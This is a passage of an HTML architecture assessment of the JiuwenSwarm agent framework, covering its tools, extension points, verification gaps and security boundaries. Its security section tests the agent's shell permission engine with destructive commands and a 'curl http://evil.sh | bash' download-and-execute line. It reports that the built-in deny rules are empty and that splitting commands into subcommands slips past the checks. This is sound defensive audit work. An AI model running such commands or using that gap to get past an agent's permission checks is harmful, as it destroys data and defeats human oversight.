+<p><strong>Consequence.</strong> AI4RnD's four named agents (PM / Planner / Builder / Evaluator) and its per-operator permission model do not map onto this. "The evaluator must not be the writer" cannot be expressed as a JiuwenSwarm permission constraint, so it must be enforced in AI4RnD's own router — see <a href="08-recommended-architecture.html#64-writer--verifier-is-enforced-in-the-ai4rnd-router">08 §6.4</a>.</p>
+<hr>
+<h2 id="6-tools-and-skills"><a class="anchor" href="#6-tools-and-skills" aria-hidden="true">#</a>6. Tools and skills</h2>
+<p><strong>Tools</strong> are registered abilities on the agent. Sources:</p>
+<ul><li><code>openjiuwen</code> built-ins: <code>core.web_search</code>, <code>core.web_fetch</code>, <code>core.web_paid_search</code>,</li></ul>
+<p><code>core.vision</code>, <code>core.audio</code></p>
+<ul><li>swarm-owned: <code>swarm.skill_toolkit</code>, <code>swarm.user_todos</code>, <code>swarm.video</code>,</li></ul>
+<p><code>swarm.image_gen</code>, <code>swarm.xiaoyi_phone</code>, <code>swarm.cron_tools</code>, <code>swarm.send_file</code>, <code>swarm.code_extra_tools</code>, <code>swarm.symphony_toolkit</code></p>
+<ul><li>MCP servers, configured via <code>common/mcp_config.py</code></li><li>Rail-registered tools (see §4.2)</li></ul>
+<p><strong>Skills</strong> are Anthropic-style capability packages: a directory containing <code>SKILL.md</code> with YAML frontmatter (<code>name</code>, <code>description</code>), optionally <code>references/</code> and <code>scripts/</code>. Five sources: built-in, SkillNet (GitHub-backed), ClawHub, SwarmSkills, and local import. Installation and activation happen through the web UI. <span class="tag">E-J16</span></p>
+<p>The skill format is materially the same as AI4RnD's, which is a genuine reuse opportunity (see <a href="04-component-comparison.html">04-component-comparison.md</a> §Skills).</p>
+<hr>
+<h2 id="7-state-and-persistence"><a class="anchor" href="#7-state-and-persistence" aria-hidden="true">#</a>7. State and persistence</h2>
+<div class="tw"><table><thead><tr><th>State</th><th>Where</th></tr></thead><tbody><tr><td>Conversation history</td><td>session store, <code>runtime/session/session_history.py</code></td></tr><tr><td>Session metadata</td><td><code>runtime/session/session_metadata.py</code></td></tr><tr><td>Task state, plans, pending follow-ups, plan-mode state</td><td>persisted into the session (documented)</td></tr><tr><td>Long-term memory</td><td>SQLite + vector index under the agent workspace</td></tr><tr><td>Skills</td><td><code>~/.jiuwenswarm/workspace/agent/skills/&lt;name&gt;/</code></td></tr><tr><td>Skill evolution records</td><td><code>evolutions.json</code> per skill directory</td></tr><tr><td>Configuration</td><td><code>~/.jiuwenswarm/config/config.yaml</code>, <code>.env</code></td></tr><tr><td>Rail plugins</td><td><code>&lt;agent_workspace&gt;/extensions/&lt;name&gt;/</code> + <code>extensions_config.json</code></td></tr><tr><td>Symphony score / index</td><td><code>symphony.paths.score_dir</code>, <code>skills_root</code></td></tr></tbody></table></div>
+<p>There is <strong>no run-artifact tree</strong>. JiuwenSwarm has no concept equivalent to AI4RnD's <code>runs/&lt;run_id&gt;/</code> directory of typed, inspectable intermediate artifacts. Intermediate reasoning lives in the session transcript, which is a chat log, not a set of validated artifacts.</p>
+<hr>
+<h2 id="8-verification-and-evaluation"><a class="anchor" href="#8-verification-and-evaluation" aria-hidden="true">#</a>8. Verification and evaluation</h2>
+<p>What exists:</p>
+<div class="tw"><table><thead><tr><th>Mechanism</th><th>What it checks</th></tr></thead><tbody><tr><td><code>TaskCompletionRail</code> / stop evaluators</td><td>whether the loop should stop (rounds, timeout, token budget, completion promise)</td></tr><tr><td>Permission engine</td><td>whether a tool call is allowed</td></tr><tr><td><code>core.security</code> rail</td><td>safety rules injected into the model call</td></tr><tr><td><code>swarm.code_lsp</code></td><td>code diagnostics after edits</td></tr><tr><td>Auto Harness CI verification</td><td>whether a harness change passes CI, with auto-fix loop</td></tr><tr><td><code>skilldev/stages/evaluate_stage.py</code></td><td>quality of a generated skill definition</td></tr><tr><td>Skill evolution signal detection</td><td>tool failures and user corrections, as improvement input</td></tr></tbody></table></div>
+<p>What does <strong>not</strong> exist, anywhere in the tree:</p>
+<ul><li>evidence ledger, claim graph, citation spans, entailment/support checks</li><li>source-authority scoring, source-diversity or freshness gates</li><li>writer ≠ verifier enforcement</li><li>a gate ledger, or node status derived as a projection of gate verdicts</li><li>factuality or grounding metrics over generated text</li></ul>
+<p>A repository-wide search finds no <code>evidence_ledger</code>, <code>citation_span</code>, <code>claim_graph</code> or <code>factuality</code> identifiers. <span class="tag">E-J14</span></p>
+<p><strong>Conclusion:</strong> JiuwenSwarm verifies <em>execution</em> (did the tool call succeed, is it permitted, should we stop) and <em>capability quality</em> (is this skill good). It does not verify <em>epistemic correctness</em> (is this claim supported by evidence). That is the entire AI4RnD contribution.</p>
+<hr>
+<h2 id="9-extension-points-ranked-by-usefulness-for-integration"><a class="anchor" href="#9-extension-points-ranked-by-usefulness-for-integration" aria-hidden="true">#</a>9. Extension points — ranked by usefulness for integration</h2>
+<h3 id="9-1-rail-plugins-the-strongest-out-of-tree-seam"><a class="anchor" href="#9-1-rail-plugins-the-strongest-out-of-tree-seam" aria-hidden="true">#</a>9.1 Rail plugins — the strongest out-of-tree seam ✅</h3>
+<p><code>RailManager</code> (<code>agents/harness/common/plugins/rail_manager.py</code>, 19KB) is a singleton that:</p>
+<ul><li>reads <code>&lt;agent_workspace&gt;/extensions/extensions_config.json</code></li><li>imports extension folders each containing <code>rail.py</code></li><li>validates the file contains a class inheriting <code>DeepAgentRail</code> or <code>AgentRail</code>, and</li></ul>
+<p>compiles cleanly</p>
+<ul><li>extracts class name, description and priority by regex</li><li>supports <code>hot_reload_rail(name, enabled)</code> → <code>agent.register_rail(...)</code> /</li></ul>
+<p><code>agent.unregister_rail(...)</code> on a live agent</p>
+<ul><li>is driven from four <code>agent_ws_server</code> handlers (import / delete / toggle / list) <span class="tag">E-J09</span></li></ul>
+<p>Combined with <code>add_ability</code> (§4.2), a Rail plugin can add tools, hook every lifecycle event, and be installed and toggled at runtime with no restart and no core-tree change.</p>
+<p><strong>Caveat:</strong> validation is regex-and-<code>compile()</code> only. There is no sandboxing, signing, or capability restriction — <code>rail.py</code> executes with full agent-server privileges.</p>
+<h3 id="9-2-extension-packages-narrow-and-half-closed"><a class="anchor" href="#9-2-extension-packages-narrow-and-half-closed" aria-hidden="true">#</a>9.2 Extension packages — narrow, and half-closed ⚠️</h3>
+<p><code>BaseExtension</code> requires <code>initialize(config)</code> and <code>shutdown()</code>. <code>ExtensionRegistry</code> accepts:</p>
+<ul><li><code>register_rpc_handler(method, handler)</code></li><li><code>register_agent_server_client(ext)</code></li><li><code>register_crypto_utility(ext)</code></li><li><code>register(event, handler, priority)</code> on the callback framework</li></ul>
+<p>Hook events are six, total: <code>gateway_started</code>, <code>gateway_stopped</code>, <code>gateway.before_chat_request</code>, <code>agent_server_started</code>, <code>agent_server_stopped</code>, <code>agent_server.before_chat_request</code>, <code>memory_before_chat</code>, <code>memory_after_chat</code>, <code>before_system_prompt_build</code>. <span class="tag">E-J07</span></p>
+<p>Discovery: <code>ExtensionManager</code> searches <code>extensions.extension_dirs</code> from config (semicolon-separated) plus the default in-package <code>jiuwenswarm/extensions</code>. Each root needs <code>extension.yaml</code> and <code>extension.py</code> exporting <code>register_extensions(registry)</code>. Declared dependencies are auto-installed with <code>uv pip install</code> or <code>pip install</code>. <span class="tag">E-J17</span></p>
+<p><strong>The closed half.</strong> An extension's registered RPC method is callable from <em>inside</em> the process — <code>symphony_toolkits.py</code> resolves handlers by string and invokes them <span class="tag">E-J18</span> — but it is <strong>not</strong> reachable from the WebSocket surface unless the method is added to:</p>
+<ol><li>the <code>ReqMethod</code> enum in <code>jiuwenswarm/common/schema/message.py</code>, and</li><li>the hardcoded <code>_SYMPHONY_METHODS</code> frozenset in <code>server/runtime/agent_adapter/interface.py:437</code> <span class="tag">E-J08</span></li></ol>
+<p>Both are core-tree files. So "extension" here means "in-tree module with a manifest", not "third-party plugin with a stable API".</p>
+<h3 id="9-3-harness-element-manifest-powerful-but-gated-by-config"><a class="anchor" href="#9-3-harness-element-manifest-powerful-but-gated-by-config" aria-hidden="true">#</a>9.3 Harness element manifest — powerful, but gated by config ⚠️</h3>
+<p><code>@harness_element</code> + <code>register_from_catalog()</code> registers rail/tool/sub-agent provider factories into <code>openjiuwen</code>'s process-global registries. Since those registries are plain <code>dict[str, Callable]</code>, an out-of-tree module <em>can</em> register into them. <span class="tag">E-J06</span></p>
+<p>But registration is not sufficient. <code>config_specs.py</code> holds hardcoded name lists (<code>_COMMON_RAIL_NAMES</code>, <code>_CODE_RAIL_NAMES</code>, <code>_COMMON_TOOL_NAMES</code>, …) that decide which elements are folded into a member's <code>DeepAgentSpec</code>. A newly registered element with no entry in those lists is never assembled. The design doc lists "configuration-file → harness loader" as <strong>future work, not implemented</strong> (§15). <span class="tag">E-J05</span></p>
+<h3 id="9-4-other-surfaces"><a class="anchor" href="#9-4-other-surfaces" aria-hidden="true">#</a>9.4 Other surfaces</h3>
+<div class="tw"><table><thead><tr><th>Surface</th><th>Nature</th></tr></thead><tbody><tr><td>MCP servers</td><td>standard MCP; config-driven; no code changes</td></tr><tr><td>Skills</td><td>file-based, hot-installable, no code changes</td></tr><tr><td>User hooks (<code>swarm.user_hooks</code>, <code>config.hooks</code>)</td><td>shell-hook style interception</td></tr><tr><td>Slash commands</td><td>documented architecture (<code>SlashCommandArchitecture.md</code>); dispatch table in the gateway/WS server</td></tr><tr><td>A2A / ACP</td><td>inbound protocol connectors — JiuwenSwarm as a <em>server</em> to external agents</td></tr><tr><td><code>agent_client</code> extension</td><td>JiuwenSwarm as a <em>client</em> of a remote agent server</td></tr></tbody></table></div>
+<hr>
+<h2 id="10-security-and-operational-boundaries"><a class="anchor" href="#10-security-and-operational-boundaries" aria-hidden="true">#</a>10. Security and operational boundaries</h2>
+<h3 id="10-1-tool-permissions"><a class="anchor" href="#10-1-tool-permissions" aria-hidden="true">#</a>10.1 Tool permissions</h3>
+<p>A three-tier action model (<code>allow</code> / <code>ask</code> / <code>deny</code>) with a tiered policy engine in <code>openjiuwen.harness.security</code>. Resolution order, per the docs <span class="tag">E-J12</span>:</p>
+<ol><li>Whole-tool baseline <code>permissions.tools.&lt;name&gt;</code> — an explicit <code>deny</code> returns immediately.</li><li>Built-in parameter rules from <code>builtin_rules.yaml</code> — any <code>DENY</code> returns immediately, and built-in deny outranks everything below.</li><li>User parameter rules from <code>permissions.rules</code> — any <code>DENY</code> returns immediately.</li><li><code>approval_overrides</code> (only <code>action: allow</code>) — a match returns <code>ALLOW</code>.</li><li>Otherwise built-in hits decide (user hits are <em>not</em> merged across layers).</li><li>Otherwise user hits decide.</li><li>Otherwise tool baseline, then <code>defaults."*"</code>, then <code>ASK</code>.</li></ol>
+<p><code>severity</code> maps to an action by <code>permission_mode</code>: in <code>strict</code>, <code>MEDIUM</code>→ask, <code>CRITICAL</code>→deny; in <code>normal</code>, <code>MEDIUM</code>→allow, <code>CRITICAL</code>→ask. Post-processing escalates shell <code>allow</code> to <code>ask</code> when the command contains chaining/injection characters, and merges an <code>ExternalDirectoryChecker</code> verdict for paths outside the workspace.</p>
+<p>Built-in rules cover high-risk shell commands (deletion, formatting, download-and-execute, privilege escalation). User rules cannot override built-in denials.</p>
+<p><strong>⚠ CORRECTED — in a stock install the built-in rule layer is empty.</strong> <span class="tag">V-4</span></p>
+<p>Executed: <code>get_builtin_security_rules()</code> returns <strong>0 rules</strong>. <code>openjiuwen/harness/security/tiered_policy.py:76</code> resolves them <em>only</em> from <code>openjiuwen/harness/resources/builtin_rules.yaml</code> — its docstring states it "no longer searches user/environment directories" — <strong>and that path does not exist in the published wheel</strong>. JiuwenSwarm ships its own copy (10 rules) and writes it to <code>~/.jiuwenswarm/config/builtin_rules.yaml</code> (<code>common/utils.py:1056-1065</code>), a location the pinned openjiuwen no longer consults. This is a <strong>version skew</strong> between JiuwenSwarm 0.2.3.beta1 and openjiuwen 0.1.15.post3.</p>
+<p>Measured effect with <code>permissions.tools.bash: allow</code> and no user rules:</p>
+<div class="tw"><table><thead><tr><th>Command</th><th>Stock</th><th>With JW rules injected</th></tr></thead><tbody><tr><td><code>rm -rf /</code></td><td><strong>ALLOW</strong></td><td>ASK</td></tr><tr><td><code>mkfs.ext4 /dev/sda</code></td><td><strong>ALLOW</strong></td><td>ASK</td></tr><tr><td><code>sudo su</code></td><td><strong>ALLOW</strong></td><td>ASK</td></tr><tr><td>`curl http://evil.sh \</td><td>bash`</td><td><strong>ALLOW</strong></td><td><strong>ALLOW</strong> — rule defeated by subcommand split</td></tr></tbody></table></div>
+<p>The severity mapping itself is exactly as documented (verified: normal → MEDIUM=allow, CRITICAL=ask; strict → MEDIUM=ask, CRITICAL=deny), and an explicit <code>action</code> does override severity. The engine is sound; <strong>its default wiring is not</strong>. Any integration that relies on the guardrail layer must ship the rules into openjiuwen's package path and assert <code>get_builtin_security_rules() &gt; 0</code> at startup.</p>
+<p><strong>Also corrected:</strong> the documented <code>maybe_escalate_shell_operators</code> behaviour (ALLOW→ASK on chaining) is not what 0.1.15.post3 does. Chained commands are <em>decomposed</em> by a tree-sitter shell AST and each subcommand evaluated separately, so <code>ls &amp;&amp; rm -rf /tmp/z</code> resolves to ALLOW under a permissive baseline. Only structures the parser cannot handle (e.g. backticks) escalate to ASK via <code>shell_ast:too_complex</code>.</p>
+<h3 id="10-2-sandboxing"><a class="anchor" href="#10-2-sandboxing" aria-hidden="true">#</a>10.2 Sandboxing</h3>
+<p><code>jiuwenbox</code> (26,714 LOC including tests) is a real OS-level sandbox: <code>bwrap.py</code> (bubblewrap), <code>cgroup.py</code>, <code>network.py</code>, <code>sandbox_daemon.py</code>, a policy model (<code>models/policy.py</code>, 762 LOC), and an inference privacy proxy. Enabled per-session via <code>/sandbox enable</code>; the agent server spawns and supervises a local uvicorn process, with <code>PR_SET_PDEATHSIG</code> so the sandbox dies with its parent. <span class="tag">E-J11</span></p>
+<h3 id="10-3-other-boundaries"><a class="anchor" href="#10-3-other-boundaries" aria-hidden="true">#</a>10.3 Other boundaries</h3>
+<ul><li>WebSocket origin checking (<code>common/security/ws_origin.py</code>)</li><li>Crypto provider abstraction (<code>common/security/base_crypto.py</code>), pluggable via extension</li><li>File-access whitelists and <code>/add-dir</code> to extend them</li><li>In digital-persona and group-chat contexts, <code>ask</code> may be downgraded to <code>deny</code></li><li>OpenTelemetry instrumentation across the dependency set</li></ul>
+<h3 id="10-4-weak-points"><a class="anchor" href="#10-4-weak-points" aria-hidden="true">#</a>10.4 Weak points</h3>
+<ul><li>Rail plugins execute arbitrary code with agent-server privileges after only a syntax</li></ul>
+<p>check (§9.1).</p>
+<ul><li><code>ExtensionLoader._install_dependencies</code> runs <code>pip install</code> / <code>uv pip install</code> on</li></ul>
+<p>manifest-declared dependencies, with a 120 s timeout and errors logged rather than raised. An extension manifest is therefore a package-installation vector. <span class="tag">E-J17</span></p>
+<hr>
+<h2 id="11-assessment-as-a-foundation"><a class="anchor" href="#11-assessment-as-a-foundation" aria-hidden="true">#</a>11. Assessment as a foundation</h2>
+<p><strong>Health, measured.</strong> The full suite runs <strong>2,816 passed, 18 skipped, 0 failed</strong> in 419 s (2,834 collected), and <code>pip install -e ".[test]"</code> completes cleanly. This is the strongest single argument for JiuwenSwarm as a substrate, and it was unavailable in Revision 1. <span class="tag">V-7</span></p>
+<p><strong>Strengths.</strong> Mature, coherent execution substrate. Real permission engine (when wired). Real sandbox. Nine IM channels plus ACP/A2A. Declarative, serialisable harness assembly that already supports distributed members. Skills with a hot-install path and five registries. Memory with hybrid retrieval. Session rewind and context compaction. Packaged and versioned on PyPI.</p>
+<p><strong>Limits for this purpose.</strong></p>
+<ol><li>No evidence, claim, citation or factuality model at all.</li><li>No run-artifact tree — no typed, inspectable intermediate artifacts.</li><li>No capability-based routing; workers are selected by role.</li><li>Extension surface is narrow out-of-tree, and the RPC path is closed by two hardcoded core-tree lists.</li><li>Roughly half the relevant runtime is in <code>openjiuwen</code>, an external pinned dependency — so an integrator's real upstream exposure is to <em>two</em> projects, not one. <strong>The most security-relevant defect found (V-4) is in <code>openjiuwen</code>, not JiuwenSwarm</strong> — which means even forking JiuwenSwarm would not let you fix it cleanly.</li><li>Documentation and code comments are substantially Chinese; the codebase assumes a Huawei-internal lint toolchain (<code>huawei-python-lint</code>).</li><li><strong>Only two member roles with a global permission policy</strong> (§5) — per-operator governance, which the intended AI4RnD product requires throughout, is not expressible.</li><li><strong>Measured against the intended product, JiuwenSwarm fully covers 20 of 142 features and covers none of 72</strong> — see <a href="14-reuse-vs-build-map.html">14-reuse-vs-build-map.md</a>. It is a substrate, not a platform for this product.</li></ol>
+<p>Continued in <a href="04-component-comparison.html">04-component-comparison.md</a>.</p></article><div class="pager"><a href="traceability-142-feature-matrix.html"><div class="d">← Previous</div><div class="t">142-feature matrix</div></a><a class="nx" href="02-ai4rnd-architecture.html"><div class="d">Next →</div><div class="t">AI4RnD architecture</div></a></div></main>
+</div>
+<button class="tt" id="tt" aria-label="Toggle colour theme">&#9689;</button>
+<script src="vendor/mermaid.min.js"></script>
+<script>
+(function(){
+  var KEY='ai4rnd-theme', r=document.documentElement;
+  var saved=localStorage.getItem(KEY); if(saved) r.setAttribute('data-theme',saved);
+  function dark(){ var a=r.getAttribute('data-theme');
+    return a? a==='dark' : matchMedia('(prefers-color-scheme:dark)').matches; }
+  document.getElementById('tt').onclick=function(){
+    var next = dark()?'light':'dark';
+    r.setAttribute('data-theme',next); localStorage.setItem(KEY,next);
+    location.reload();
+  };
+
+  var FONT='"Schibsted Grotesk",-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif';
+  var LIGHT={background:'#ffffff',mainBkg:'#fafafb',primaryColor:'#fafafb',
+    primaryTextColor:'#1a1b1d',primaryBorderColor:'#d3d4d9',secondaryColor:'#f4f4f6',
+    secondaryTextColor:'#1a1b1d',secondaryBorderColor:'#d3d4d9',tertiaryColor:'#ffffff',
+    tertiaryTextColor:'#1a1b1d',tertiaryBorderColor:'#e6e6ea',
+    nodeBorder:'#d3d4d9',clusterBkg:'#ffffff',clusterBorder:'#e6e6ea',
+    lineColor:'#8b8d94',textColor:'#1a1b1d',titleColor:'#a60822',
+    edgeLabelBackground:'#ffffff',labelBackground:'#ffffff',
+    noteBkgColor:'#f4f4f6',noteTextColor:'#54565c',noteBorderColor:'#e6e6ea',
+    actorBkg:'#fafafb',actorBorder:'#d3d4d9',actorTextColor:'#1a1b1d',
+    signalColor:'#54565c',signalTextColor:'#1a1b1d',
+    labelBoxBkgColor:'#f4f4f6',labelBoxBorderColor:'#d3d4d9',labelTextColor:'#1a1b1d',
+    loopTextColor:'#54565c',altBackground:'#fafafb',
+    sectionBkgColor:'#f4f4f6',sectionBkgColor2:'#fafafb',altSectionBkgColor:'#ffffff',
+    taskBkgColor:'#f4f4f6',taskBorderColor:'#d3d4d9',taskTextColor:'#1a1b1d',
+    taskTextDarkColor:'#1a1b1d',taskTextOutsideColor:'#54565c',
+    activeTaskBkgColor:'#cf0a2c',activeTaskBorderColor:'#a60822',
+    doneTaskBkgColor:'#e6e6ea',doneTaskBorderColor:'#d3d4d9',
+    critBkgColor:'#fbefd0',critBorderColor:'#b26a00',
+    gridColor:'#e6e6ea',todayLineColor:'#cf0a2c',
+    transitionColor:'#8b8d94',stateBkg:'#fafafb',stateBorder:'#d3d4d9'};
+  var DARK={background:'#131316',mainBkg:'#191a1d',primaryColor:'#191a1d',
+    primaryTextColor:'#e8e8ea',primaryBorderColor:'#3a3b40',secondaryColor:'#1f2024',
+    secondaryTextColor:'#e8e8ea',secondaryBorderColor:'#3a3b40',tertiaryColor:'#131316',
+    tertiaryTextColor:'#e8e8ea',tertiaryBorderColor:'#2a2b30',
+    nodeBorder:'#3a3b40',clusterBkg:'#131316',clusterBorder:'#2a2b30',
+    lineColor:'#8b8d94',textColor:'#e8e8ea',titleColor:'#ff8397',
+    edgeLabelBackground:'#131316',labelBackground:'#131316',
+    noteBkgColor:'#1f2024',noteTextColor:'#a4a6ac',noteBorderColor:'#2a2b30',
+    actorBkg:'#191a1d',actorBorder:'#3a3b40',actorTextColor:'#e8e8ea',
+    signalColor:'#a4a6ac',signalTextColor:'#e8e8ea',
+    labelBoxBkgColor:'#1f2024',labelBoxBorderColor:'#3a3b40',labelTextColor:'#e8e8ea',
+    loopTextColor:'#a4a6ac',altBackground:'#191a1d',
+    sectionBkgColor:'#1f2024',sectionBkgColor2:'#191a1d',altSectionBkgColor:'#131316',
+    taskBkgColor:'#1f2024',taskBorderColor:'#3a3b40',taskTextColor:'#e8e8ea',
+    taskTextDarkColor:'#e8e8ea',taskTextOutsideColor:'#a4a6ac',
+    activeTaskBkgColor:'#ff5d74',activeTaskBorderColor:'#ff8397',
+    doneTaskBkgColor:'#2a2b30',doneTaskBorderColor:'#3a3b40',
+    critBkgColor:'#3a2e18',critBorderColor:'#e0a355',
+    gridColor:'#2a2b30',todayLineColor:'#ff5d74',
+    transitionColor:'#8b8d94',stateBkg:'#191a1d',stateBorder:'#3a3b40'};
+  if(window.mermaid){
+    var v = dark()? DARK : LIGHT; v.fontFamily = FONT; v.fontSize = '13px';
+    mermaid.initialize({startOnLoad:true, securityLevel:'loose', theme:'base',
+      themeVariables:v, flowchart:{curve:'basis',useMaxWidth:false,htmlLabels:true},
+      sequence:{useMaxWidth:false}, gantt:{useMaxWidth:false}});
+  } else {
+    document.querySelectorAll('pre.mermaid').forEach(function(el){
+      el.classList.add('raw');
+      var n=document.createElement('div'); n.className='fignote';
+      n.textContent='Diagram source (renderer unavailable offline)';
+      el.parentNode.insertBefore(n, el);
+    });
+  }
+})();
+</script></body></html>
